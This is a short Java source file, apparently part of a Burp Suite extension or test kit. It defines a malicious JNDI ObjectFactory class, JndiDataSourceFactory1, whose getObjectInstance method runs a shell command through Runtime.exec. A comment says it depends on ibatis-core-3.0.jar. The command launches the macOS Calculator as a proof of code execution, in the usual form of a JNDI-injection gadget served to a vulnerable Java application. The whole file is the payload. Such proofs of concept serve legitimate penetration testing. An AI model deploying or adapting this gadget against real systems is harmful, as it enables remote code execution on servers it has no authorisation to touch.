package burp.gadget;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

/**
 * 依赖ibatis-core-3.0.jar
 */

public class JndiDataSourceFactory1 implements ObjectFactory {
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
        return null;
    }
}